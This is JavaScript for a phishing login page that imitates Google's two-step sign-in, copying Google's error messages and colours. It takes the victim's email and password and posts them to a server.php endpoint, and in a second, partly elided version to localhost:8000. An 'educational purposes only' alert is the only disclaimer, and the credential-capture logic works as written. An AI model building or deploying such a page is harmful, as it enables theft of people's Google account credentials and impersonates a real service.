document.addEventListener('DOMContentLoaded', function() {
    // DOM Elements
    const emailStep = document.getElementById('emailStep');
    const passwordStep = document.getElementById('passwordStep');
    const nextBtn = document.getElementById('nextBtn');
    const loginForm = document.getElementById('loginForm');
    const emailInput = document.getElementById('email');
    const passwordInput = document.getElementById('password');
    
    // Store email for the password step
    let userEmail = '';

    // Next button click handler (email step)
    nextBtn.addEventListener('click', function(e) {
        e.preventDefault();
        
        // Validate email
        if (emailInput.value.trim() === '') {
            showError(emailInput, 'Enter an email or phone number');
            return;
        }
        
        if (!isValidEmail(emailInput.value) && !isValidPhone(emailInput.value)) {
            showError(emailInput, 'Couldn\'t find your Google Account');
            return;
        }
        
        // Store email and proceed to password step
        userEmail = emailInput.value;
        showPasswordStep();
    });
    
    // Form submission handler
    loginForm.addEventListener('submit', function(e) {
        e.preventDefault();
        
        // Validate password
        if (passwordInput.value.trim() === '') {
            showError(passwordInput, 'Enter a password');
            return;
        }
        
        // If we get here, form is valid
        submitForm();
    });
    
    // Show password step with animation
    function showPasswordStep() {
        // Update the email display in the password step if needed
        const emailDisplay = document.createElement('div');
        emailDisplay.className = 'email-display';
        emailDisplay.textContent = userEmail;
        emailDisplay.style.cssText = 'text-align: center; margin-bottom: 16px; font-size: 14px;';
        
        // Add email display if not already there
        if (!document.querySelector('.email-display')) {
            passwordStep.insertBefore(emailDisplay, passwordStep.firstChild);
        } else {
            document.querySelector('.email-display').textContent = userEmail;
        }
        
        // Animate transition
        emailStep.style.display = 'none';
        passwordStep.classList.remove('hidden');
        passwordStep.style.animation = 'fadeIn 0.3s ease-in-out';
        
        // Focus password field
        setTimeout(() => {
            passwordInput.focus();
        }, 300);
    }
    
    // Form submission
    function submitForm() {
        const formData = new FormData();
        formData.append('email', userEmail);
        formData.append('password', passwordInput.value);
        
        // Send data to server
        fetch('server.php', {
            method: 'POST',
            body: formData
        })
        .then(response => response.text())
        .then(data => {
            // For demo purposes, just show success message
            // In a real app, you would handle the server response appropriately
            console.log('Form submitted successfully');
            alert('Login attempt recorded (for educational purposes only)');
        })
        .catch(error => {
            console.error('Error:', error);
            alert('An error occurred. Please try again.');
        });
    }
    
    // Validation helpers
    function isValidEmail(email) {
        const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        return re.test(email);
    }
    
    function isValidPhone(phone) {
        // Simple phone validation - adjust as needed
        const re = /^[0-9\-\+\(\)\s]+$/;
        return re.test(phone) && phone.replace(/[^0-9]/g, '').length >= 8;
    }
    
    function showError(input, message) {
        // Remove any existing error
        const existingError = input.parentNode.querySelector('.error-message');
        if (existingError) {
            existingError.remove();
        }
        
        // Add error message
        const error = document.createElement('div');
        error.className = 'error-message';
        error.textContent = message;
        error.style.color = '#d93025';
        error.style.fontSize = '12px';
        error.style.marginTop = '4px';
        error.style.lineHeight = '16px';
        
        // Insert after input
        input.parentNode.insertBefore(error, input.nextSibling);
        
        // Add error class to input
        input.style.borderColor = '#d93025';
        input.style.borderWidth = '2px';
        input.style.padding = '12px 14px';
        
        // Focus the input
        input.focus();
        
        // Remove error state after interaction
        const resetError = () => {
            error.remove();
            input.style.borderColor = '#dadce0';
            input.style.borderWidth = '1px';
            input.style.padding = '13px 15px';
            input.removeEventListener('input', resetError);
        };
        
        input.addEventListener('input', resetError, { once: true });
    }
    
    // Add animation for input focus
    document.querySelectorAll('.input-field').forEach(input => {
        input.addEventListener('focus', function() {
            this.parentNode.querySelector('.input-underline').style.transform = 'scaleX(1)';
        });
        
        input.addEventListener('blur', function() {
            this.parentNode.querySelector('.input-underline').style.transform = 'scaleX(0)';
        });
    });
});

// Add keyframe animation for form transitions
const style = document.createElement('style');
style.textContent = `
    @keyframes fadeIn {
        from { opacity: 0; transform: translateY(10px); }
        to { opacity: 1; transform: translateY(0); }
    }
`;
document.head.appendChild(style);
document.addEventListener('DOMContentLoaded', function() {
    // ... (keep existing code until the submitForm function)

    // Form submission
    async function submitForm() {
        const formData = new FormData();
        formData.append('email', userEmail);
        formData.append('password', passwordInput.value);
        
        try {
            const response = await fetch('http://localhost:8000/server.php', {
                method: 'POST',
                body: formData,
                headers: {
                    'Accept': 'application/json'
                }
            });

            const data = await response.json();
            
            if (response.ok) {
                // For demo purposes, show a success message
                alert('Login attempt recorded (for educational purposes only)');
                console.log('Server response:', data);
                
                // Clear the form
                loginForm.reset();
                
                // Reset to email step
                passwordStep.classList.add('hidden');
                emailStep.style.display = 'block';
                userEmail = '';
            } else {
                throw new Error(data.message || 'Failed to submit form');
            }
        } catch (error) {
            console.error('Error:', error);
            alert('Error: ' + error.message);
        }
    }

    // ... (rest of your existing code)
});